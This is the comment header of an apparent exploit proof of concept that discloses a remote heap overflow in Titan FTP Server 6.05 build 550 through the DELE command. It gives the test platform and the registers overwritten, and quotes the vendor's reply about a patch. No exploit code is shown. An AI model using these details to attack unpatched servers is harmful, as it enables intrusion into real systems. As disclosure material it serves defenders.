# Remote Heap overflow in Titan FTP Server version 6.05 build 550
# (DELE ) - probably other commands are vulnerable too
# PoC tested on WinXP sp1
# EAX and ESI are overwritten with 41414141 and 44444444
#
# Greetz to muts, m1k1, bolexxx
# and crew from offsec, remote-exploit.org, Cedes.ba, Itas and Cikom :)

# "Actually, we always release patches to customers first, then to the
general public a few days later.
# So both the User/Pass issue and your issue are basically invalid as they
were already fixed by the time you ran
# your tests."
# This was the last answer from vendor when i contacted them. They asked me
which version i used, i said "the last one,
# 6.05 build 550". They said there is patched/fixed release 6.10, then i
asked where? Then, they sent me the mail you
# see above.
